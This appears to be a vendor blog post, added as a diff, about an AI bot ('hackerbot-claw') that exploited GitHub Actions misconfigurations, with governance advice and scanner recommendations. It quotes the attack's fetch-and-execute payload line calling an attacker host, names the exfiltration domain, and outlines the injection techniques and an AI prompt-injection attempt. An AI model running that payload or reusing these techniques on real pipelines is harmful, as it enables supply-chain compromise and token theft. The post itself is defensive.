@@ -1,0 +1,408 @@
+---
+title: "hackerbot-claw: CI/CD Pipelines Are the New Attack Surface"
+description: "An AI bot compromised 5 of 7 major repos in one week via CI/CD misconfigurations. A call to govern, not patch. Why CI/CD compliance and pipeline governance must become standard."
+draft: false
+authors:
+  - plumber
+pubDate: 2026-03-03
+heroImage: ./heroImage.png
+categories:
+  - "CI/CD"
+  - "Security"
+  - "DevOps"
+  - "Supply Chain Security"
+  - "GitHub Actions"
+  - "GitLab"
+  - "Governance"
+  - "Compliance"
+---
+
+# hackerbot-claw: CI/CD Pipelines Are the New Attack Surface
+
+In one week (Feb 21-28, 2026), an autonomous AI bot called **hackerbot-claw** compromised 5 of 7 major open-source repositories using misconfigured CI/CD workflows. This article is not a technical dissection of the attack. It's about the governance failure it exposed.
+
+<Aside variant="info" title="In this article">
+
+- **The attack**: targets, techniques, and results at a glance
+- **The lesson**: every exploit was a documented, avoidable misconfiguration
+- **The cost**: concrete damage from Trivy, awesome-go, DataDog, and others
+- **The fix**: what CI/CD governance looks like in practice (4 steps)
+- **The tools**: Plumber (GitLab), poutine, zizmor, StepSecurity Harden-Runner
+
+</Aside>
+
+## The attack at a glance
+
+<div className="not-content grid gap-4 sm:grid-cols-3 sm:gap-6 my-6">
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6 text-center">
+    <p className="text-3xl mb-2">7</p>
+    <p className="font-semibold text-foreground">Repositories targeted</p>
+    <p className="mt-2 text-sm text-foreground/80">Microsoft, DataDog, CNCF, and top open-source projects</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6 text-center">
+    <p className="text-3xl mb-2">5</p>
+    <p className="font-semibold text-foreground">Successfully compromised</p>
+    <p className="mt-2 text-sm text-foreground/80">RCE confirmed or likely, tokens exfiltrated</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6 text-center">
+    <p className="text-3xl mb-2">7 days</p>
+    <p className="font-semibold text-foreground">Total campaign duration</p>
+    <p className="mt-2 text-sm text-foreground/80">Fully autonomous, powered by AI, running 24/7</p>
+  </div>
+</div>
+
+**hackerbot-claw**, a self-described "autonomous security research agent powered by claude-opus-4-5," scanned public repositories for exploitable GitHub Actions workflows and opened pull requests designed to trigger code execution inside CI runners.
+
+| Target | Technique | Result |
+|---|---|---|
+| **aquasecurity/trivy** (25k+ stars) | PAT theft via `pull_request_target` | Full repository compromise, all 178 releases deleted, malicious VS Code extension published |
+| **avelino/awesome-go** (140k+ stars) | Poisoned Go `init()` function | RCE confirmed, `GITHUB_TOKEN` with write permissions exfiltrated |
+| **project-akri/akri** (CNCF) | Direct script injection | RCE confirmed |
+| **microsoft/ai-discovery-agent** | Branch name injection | RCE likely (2m38s timing gap) |
+| **DataDog/datadog-iac-scanner** | Filename-based command injection | RCE likely, emergency patches deployed in 9 hours |
+| **ambient-code/platform** | AI prompt injection targeting Claude | Blocked by Claude's prompt injection detection |
+| **RustPython/RustPython** (20k+ stars) | Base64 branch name injection | Partial execution (decoding failed on a technicality) |
+
+Every attack delivered the same payload (`curl -sSfL hackmoltrepeat.com/molt | bash`) but each used a completely different technique.
+
+<Admonition variant="info">
+This article focuses on governance and prevention, not on the technical details of the attack. For the full breakdown, see: [StepSecurity analysis](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) | [Stéphane Robert's write-up](https://blog.stephane-robert.info/post/trivy-depot-github-vide/) | [Aqua Security incident thread](https://github.com/aquasecurity/trivy/discussions/10265)
+</Admonition>
+
+---
+
+## The real lesson: you can't patch what you never governed
+
+Every single vulnerability exploited by hackerbot-claw was a **known anti-pattern**. Not a zero-day. Not a sophisticated bypass. Known, documented, avoidable misconfigurations:
+
+<div className="not-content grid gap-4 sm:grid-cols-2 sm:gap-4 my-6">
+  <div className="border-error/30 dark:border-error/20 rounded-xl border bg-error/5 dark:bg-error/5 p-5">
+    <p className="font-semibold text-foreground mb-2">`pull_request_target` + untrusted checkout</p>
+    <p className="text-sm text-foreground/80">Workflows running fork code with the target repo's secrets and permissions.</p>
+  </div>
+  <div className="border-error/30 dark:border-error/20 rounded-xl border bg-error/5 dark:bg-error/5 p-5">
+    <p className="font-semibold text-foreground mb-2">Unescaped `$｛｛ ｝｝` in shell commands</p>
+    <p className="text-sm text-foreground/80">Expressions interpolated directly into `run:` blocks, enabling injection via branch names, filenames, or comments.</p>
+  </div>
+  <div className="border-error/30 dark:border-error/20 rounded-xl border bg-error/5 dark:bg-error/5 p-5">
+    <p className="font-semibold text-foreground mb-2">No `author_association` checks</p>
+    <p className="text-sm text-foreground/80">Any GitHub user, including the attacker, could trigger workflows via comments like `/version minor` or `/format`.</p>
+  </div>
+  <div className="border-error/30 dark:border-error/20 rounded-xl border bg-error/5 dark:bg-error/5 p-5">
+    <p className="font-semibold text-foreground mb-2">Excessive token permissions</p>
+    <p className="text-sm text-foreground/80">`contents: write` where `read` would suffice. Overpowered PATs accessible from workflow context.</p>
+  </div>
+</div>
+
+All of these are documented in the [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/). Security researchers have warned about them for years. Yet even security-focused organizations were vulnerable, because no organizational policy enforced these rules automatically.
+
+---
+
+## Prevention costs less than remediation
+
+Every incident below required emergency response, credential rotation, security audits, and public disclosure. Some of that trust never comes back.
+
+<div className="not-content my-6 space-y-4">
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6">
+    <p className="font-semibold text-lg text-foreground mb-3">Trivy (Aqua Security)</p>
+    <ul className="space-y-1 text-sm text-foreground/80 list-disc pl-5">
+      <li>All <strong>178 GitHub releases</strong> deleted (versions 0.27.0 through 0.69.1)</li>
+      <li>Repository privatized and recreated from scratch (<strong>25,000+ stars lost</strong>)</li>
+      <li>A <strong>malicious VS Code extension</strong> published to Open VSIX marketplace (unknown number of installations)</li>
+      <li>Every user who installed Trivy between Feb 21-28 must <strong>verify binary integrity</strong></li>
+      <li>Thousands of CI/CD pipelines worldwide <strong>broken</strong> until v0.69.2 was republished</li>
+      <li>Ongoing trust deficit: <em>"Who scans the scanner?"</em></li>
+    </ul>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6">
+    <p className="font-semibold text-lg text-foreground mb-3">awesome-go (140k+ stars)</p>
+    <ul className="space-y-1 text-sm text-foreground/80 list-disc pl-5">
+      <li>A `GITHUB_TOKEN` with <strong>`contents: write`</strong> and <strong>`pull-requests: write`</strong> was exfiltrated</li>
+      <li>The attacker could <strong>push commits and merge PRs</strong> in one of GitHub's most popular repositories</li>
+    </ul>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-xl border bg-base-100 dark:bg-base-800/50 p-6">
+    <p className="font-semibold text-lg text-foreground mb-3">Broader ecosystem impact</p>
+    <ul className="space-y-1 text-sm text-foreground/80 list-disc pl-5">
+      <li><strong>DataDog</strong> scrambled to deploy emergency fixes within 9 hours</li>
+      <li>The <strong>CNCF project akri</strong> had confirmed remote code execution</li>
+      <li><strong>Microsoft's</strong> ai-discovery-agent likely had code execution in its runners</li>
+      <li><strong>RustPython</strong> (20k+ stars) had partial code execution on their CI runners</li>
+    </ul>
+  </div>
+</div>
+
+<blockquote className="not-content bg-primary-400/10 rounded-r border-primary-600 dark:border-primary-400 my-8 border-l-4 pl-6 py-4">
+  <p className="italic text-foreground text-lg">
+    Contrast this with the cost of prevention: defining a set of CI/CD security policies and enforcing them continuously. That is an investment you make once and maintain incrementally.
+  </p>
+  <p className="mt-3 text-sm text-foreground/80">
+    The ROI is not theoretical. It's the difference between a normal Tuesday and a full-blown supply chain incident.
+  </p>
+</blockquote>
+
+---
+
+## CI/CD is infrastructure. Govern it like infrastructure.
+
+We wouldn't deploy a production server without firewall rules, access controls, and monitoring. Yet CI/CD pipelines, which handle source code, secrets, and production deployments, routinely run with:
+
+<div className="not-content grid gap-3 sm:grid-cols-2 lg:grid-cols-3 my-6">
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No permission boundaries</p>
+    <p className="text-xs text-foreground/70 mt-1">Default read-write tokens everywhere</p>
+  </div>
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No input validation</p>
+    <p className="text-xs text-foreground/70 mt-1">Expressions injected into shell commands</p>
+  </div>
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No network controls</p>
+    <p className="text-xs text-foreground/70 mt-1">Runners can call any external endpoint</p>
+  </div>
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No policy enforcement</p>
+    <p className="text-xs text-foreground/70 mt-1">Anyone can merge a workflow change</p>
+  </div>
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No continuous compliance</p>
+    <p className="text-xs text-foreground/70 mt-1">Configurations drift silently</p>
+  </div>
+  <div className="border-warning/30 dark:border-warning/20 rounded-lg border bg-warning/5 dark:bg-warning/5 px-4 py-3">
+    <p className="font-semibold text-sm text-foreground">No audit trail</p>
+    <p className="text-xs text-foreground/70 mt-1">No visibility into what pipelines actually do</p>
+  </div>
+</div>
+
+<blockquote className="not-content bg-base-200/50 dark:bg-base-800/50 rounded-r border-base-400 dark:border-base-500 my-8 border-l-4 pl-6 py-4">
+  <p className="italic text-foreground">
+    "You can't defend against automation with manual controls, you need automated guardrails."
+  </p>
+  <footer className="mt-3 not-italic text-sm font-medium text-foreground/70">
+    StepSecurity, hackerbot-claw analysis
+  </footer>
+</blockquote>
+
+---
+
+## What governance actually looks like
+
+CI/CD governance is not about adding friction. It's about clear rules enforced automatically so developers can move fast *and* stay secure.
+
+<Steps>
+
+1. **Define organizational rules for pipeline behavior**
+
+    Every organization should have a baseline set of CI/CD security policies. These are not suggestions, they are rules that every pipeline must follow:
+
+    - **Token permissions**: Always declare explicit, minimal `permissions` blocks. Never rely on defaults.
+    - **Trigger restrictions**: `pull_request_target` workflows must never check out untrusted code. Comment-triggered workflows must verify `author_association`.
+    - **Expression safety**: `${{ }}` expressions must never appear directly in `run:` blocks. Use environment variables.
+    - **Dependency pinning**: Actions and images must be pinned by SHA, not by mutable tags.
+    - **Secret exposure**: Never use `toJSON(secrets)`. Expose only the secrets each job needs.
+    - **Network egress**: Runners should only reach authorized endpoints.
+
+2. **Enforce rules continuously, not periodically**
+
+    A security audit every quarter does not catch the misconfiguration that was merged last Tuesday. Governance must be continuous:
+
+    - Scan every pipeline change at PR/MR time
+    - Monitor compliance posture across all projects in real time
+    - Alert on drift and non-conformities before they become attack vectors
+
+3. **Treat CI/CD configuration as code (and review it as code)**
+
+    Workflow files deserve the same review scrutiny as application code. Add CI/CD configuration files to `CODEOWNERS`. Require maintainer approval for any changes to `.github/workflows/` or `.gitlab-ci.yml`.
+
+4. **Assume attackers will target your pipelines**
+
+    The hackerbot-claw campaign is a preview: autonomous bots scanning for CI/CD misconfigurations 24/7, adapting their techniques per target. Manual reviews and periodic audits cannot keep pace with this threat model.
+
+</Steps>
+
+---
+
+## Tools that help you govern CI/CD pipelines
+
+You don't have to build governance from scratch. Several tools address this problem today, across different CI/CD platforms.
+
+### Plumber: CI/CD compliance for GitLab
+
+<div className="not-content rounded-xl border-2 border-primary-600 dark:border-primary-400 bg-primary-400/10 dark:bg-primary-400/5 p-6 my-6">
+
+**[Plumber](https://getplumber.io)** is purpose-built for GitLab CI/CD governance. It comes in two forms: an **open-source CLI** for individual projects, and a **Platform** for organization-wide compliance at scale.
+
+**The Plumber CLI** scans your pipelines and repository settings for compliance violations. Run it locally or integrate it into your CI to catch misconfigurations at every merge request:
+
+- Detect missing secret detection, untrusted dependencies, hardcoded credentials, excessive permissions
+- Get a compliance score you can track over time
+- Output reports in multiple formats for audit readiness
+
+**The Plumber Platform** is where governance scales. When you're managing tens, hundreds, or thousands of GitLab projects, the CLI alone isn't enough. You need visibility across your entire organization:
+
+<div className="not-content grid gap-4 sm:grid-cols-2 my-4">
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground mb-1">Organization-wide dashboard</p>
+    <p className="text-sm text-foreground/80">See the compliance posture of every project at a glance. Spot which projects are drifting from your security baselines in real time.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground mb-1">Tailored compliance policies</p>
+    <p className="text-sm text-foreground/80">Define multiple policies (ISO 27001, OWASP, SecNumCloud, or custom) and assign them to specific projects or portfolios.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground mb-1">One-click bulk remediation</p>
+    <p className="text-sm text-foreground/80">Select non-compliant issues and fix them in bulk. Plumber creates merge requests automatically, and you can merge them all at once.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground mb-1">Audit-ready reporting</p>
+    <p className="text-sm text-foreground/80">Export compliance reports in PDF/CSV. Schedule automated reports to management or auditors. Track compliance history and trends over time.</p>
+  </div>
+</div>
+
+The Platform also integrates directly into GitLab: project compliance badges, merge request comments with compliance feedback, and dynamic project issues for live compliance status.
+
+Instead of reacting to incidents, you define rules and Plumber enforces them continuously across every project.
+
+<div className="flex gap-3 mt-4">
+  <Button variant="primary" href="https://getplumber.io/platform/" size="md">Try the Platform</Button>
+  <Button variant="outline" href="https://github.com/getplumber/plumber" size="md">CLI on GitHub</Button>
+</div>
+
+</div>
+
+### poutine: CI/CD security scanner (multi-platform)
+
+[poutine](https://github.com/boostsecurityio/poutine), created by BoostSecurity.io, is a security scanner that detects misconfigurations and vulnerabilities in build pipelines. It supports **GitHub Actions, GitLab CI, Azure DevOps, and Tekton**, and can scan an entire organization in a single command.
+
+<div className="not-content grid gap-3 sm:grid-cols-2 my-4">
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">13 built-in security rules</p>
+    <p className="text-xs text-foreground/80 mt-1">Covers the exact patterns exploited by hackerbot-claw: `untrusted_checkout_exec`, `injection`, `default_permissions_on_risky_events`, and more.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">Organization-wide scanning</p>
+    <p className="text-xs text-foreground/80 mt-1">`analyze_org` scans all repos in one command for a global security posture view.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">Custom Rego rules</p>
+    <p className="text-xs text-foreground/80 mt-1">Write organization-specific policies using Open Policy Agent's Rego language.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">CVE detection + SARIF output</p>
+    <p className="text-xs text-foreground/80 mt-1">Detects known vulnerabilities in third-party actions (via OSV) and integrates with GitHub Advanced Security.</p>
+  </div>
+</div>
+
+[GitHub Repository](https://github.com/boostsecurityio/poutine) | [Guide: Scanner vos pipelines avec poutine](https://blog.stephane-robert.info/docs/pipeline-cicd/github/securite/poutine/)
+
+### zizmor: static analysis for GitHub Actions
+
+[zizmor](https://github.com/zizmorcore/zizmor) is a Rust-based static analysis tool specifically designed for GitHub Actions. Fast, precise, with auto-fix capabilities.
+
+<div className="not-content grid gap-3 sm:grid-cols-2 my-4">
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">30+ security rules</p>
+    <p className="text-xs text-foreground/80 mt-1">Template injection, credential persistence, excessive permissions, impostor commits, and more.</p>
+  </div>
+  <div className="border-base-300 dark:border-base-600 rounded-lg border bg-base-100 dark:bg-base-800/50 p-4">
+    <p className="font-semibold text-foreground text-sm">Auto-fix mode</p>
+    <p className="text-xs text-foreground/80 mt-1">`--fix` automatically remediates common issues. Fast local scanning optimized for developer workflows.</p>
+  </div>
+</div>
+
+Use zizmor for fast local scans with auto-fix during development, and poutine for organization-wide audits.
+
+[GitHub Repository](https://github.com/zizmorcore/zizmor) | [Documentation](https://docs.zizmor.sh/)
+
+### StepSecurity Harden-Runner: runtime protection for CI runners
+
+[Harden-Runner](https://docs.stepsecurity.io/harden-runner/how-tos/block-egress-traffic) monitors outbound network traffic from GitHub Actions runners and can **block unauthorized calls**. This is the same technology that detected the [tj-actions/changed-files compromise](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised) and the hackerbot-claw campaign. In the awesome-go attack, the payload exfiltrated a `GITHUB_TOKEN` to `recv.hackmoltrepeat.com`. With Harden-Runner's network egress policy, that call would have been blocked before the token left the runner.
+
+---
+
+## The recommended approach: combine tools by platform
+
+| Platform | Static analysis / Compliance | Runtime protection |
+|---|---|---|
+| **GitLab CI/CD** | [Plumber CLI + Platform](https://getplumber.io) | Network egress controls |
+| **GitHub Actions** | [poutine](https://github.com/boostsecurityio/poutine) + [zizmor](https://github.com/zizmorcore/zizmor) | [StepSecurity Harden-Runner](https://docs.stepsecurity.io/harden-runner/how-tos/block-egress-traffic) |
+| **Multi-platform** | [poutine](https://github.com/boostsecurityio/poutine) (GitHub, GitLab, Azure DevOps, Tekton) | Per-platform controls |
+
+---
+
+## Key Takeaways
+
+<Aside variant="caution" title="What to remember from this article">
+
+1. **Every exploit was a known anti-pattern.** hackerbot-claw used `pull_request_target` abuse, expression injection, excessive token permissions, missing author checks. All documented, all avoidable.
+2. **5 of 7 targets were compromised**, including security-focused organizations (Aqua Security, DataDog, CNCF). Having a security product does not mean your pipelines are secure.
+3. **Autonomous bots scanning for CI/CD misconfigurations are the new normal.** Manual reviews and quarterly audits cannot keep pace.
+4. **Define rules, enforce continuously, treat workflow files as critical code.** Add CI/CD configs to CODEOWNERS, require maintainer approval, scan at every PR/MR.
+5. **Layer your defenses**: static analysis (Plumber, poutine, zizmor) + runtime protection (Harden-Runner) + continuous compliance monitoring. No single tool covers everything.
+
+</Aside>
+
+<blockquote className="not-content bg-error/5 dark:bg-error/5 rounded-r border-error/50 dark:border-error/30 my-8 border-l-4 pl-6 py-4">
+  <p className="italic text-foreground">
+    Trivy, a security scanner used by millions, was taken down because a single GitHub Actions workflow had excessive permissions and checked out untrusted code.
+  </p>
+  <p className="mt-2 text-foreground/80 text-sm">
+    The irony: a security tool compromised by the very class of vulnerability it was designed to detect.
+  </p>
+</blockquote>
+
+Don't wait for your own incident. The tools exist today. The question is whether you'll adopt them before or after the next hackerbot finds your workflows.
+
+<Aside variant="tip" title="Start securing your CI/CD pipelines today">
+
+Try [Plumber](https://getplumber.io) for GitLab CI/CD compliance, or scan your GitHub Actions with [poutine](https://github.com/boostsecurityio/poutine) and [zizmor](https://github.com/zizmorcore/zizmor).
+
+</Aside>
+
+---
+
+## References
+
+<div class="my-4 grid gap-2 sm:grid-cols-2">
+
+<a href="https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">StepSecurity Analysis</strong>
+  <p class="text-foreground/60 mt-1 text-sm">hackerbot-claw: An AI-Powered Bot Exploiting GitHub Actions</p>
+</a>
+
+<a href="https://blog.stephane-robert.info/post/trivy-depot-github-vide/" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">Stéphane Robert</strong>
+  <p class="text-foreground/60 mt-1 text-sm">Trivy vidé après une attaque supply chain par un bot IA</p>
+</a>
+
+<a href="https://github.com/aquasecurity/trivy/discussions/10265" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">Aqua Security</strong>
+  <p class="text-foreground/60 mt-1 text-sm">Trivy security incident 2026-03-01 (official thread)</p>
+</a>
+
+<a href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">OWASP Top 10 CI/CD Risks</strong>
+  <p class="text-foreground/60 mt-1 text-sm">Industry reference for pipeline security</p>
+</a>
+
+<a href="https://getplumber.io" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">Plumber</strong>
+  <p class="text-foreground/60 mt-1 text-sm">CI/CD compliance for GitLab (CLI + Platform)</p>
+</a>
+
+<a href="https://github.com/boostsecurityio/poutine" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">poutine</strong>
+  <p class="text-foreground/60 mt-1 text-sm">CI/CD security scanner (GitHub, GitLab, Azure DevOps, Tekton)</p>
+</a>
+
+<a href="https://github.com/zizmorcore/zizmor" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">zizmor</strong>
+  <p class="text-foreground/60 mt-1 text-sm">Static analysis for GitHub Actions with auto-fix</p>
+</a>
+
+<a href="https://blog.stephane-robert.info/docs/pipeline-cicd/github/securite/poutine/" class="border-border/50 hover:border-primary-500/50 dark:hover:border-primary-500/30 block rounded-lg border p-4 transition no-underline">
+  <strong class="text-foreground">poutine Guide</strong>
+  <p class="text-foreground/60 mt-1 text-sm">Scanner vos pipelines CI/CD avec poutine</p>
+</a>
+
+</div>
